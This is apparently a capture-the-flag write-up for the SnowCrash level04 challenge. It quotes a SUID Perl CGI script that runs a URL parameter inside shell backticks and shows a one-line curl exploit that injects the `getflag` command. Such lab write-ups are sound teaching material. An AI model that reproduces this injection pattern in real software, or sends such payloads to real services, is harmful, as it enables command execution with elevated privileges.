# Level04 – SnowCrash

## Objective
Retrieve the flag for level04 by exploiting a vulnerable SUID Perl web script running locally.

## Reconnaissance
The home directory contains a SUID Perl script `level04.pl` listening on port `4747`.
It reads a GET parameter `x` and executes it directly via Perl backticks:
```bash
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

### Vulnerability
- User-controlled input is executed directly in a shell via backticks
```bash
print `echo $y 2>&1`;
```
- This creates a command injection vulnerability.
- Because the script is SUID (owned by `flag04`), any command executed runs with `flag04` privileges.

## Exploitation
- Access the local web service and inject the `getflag` command:
```bash
curl 'http://localhost:4747/?x=`getflag`'
```

## Flag
![Level04 Flag Screenshot](images/level04_flag.png)
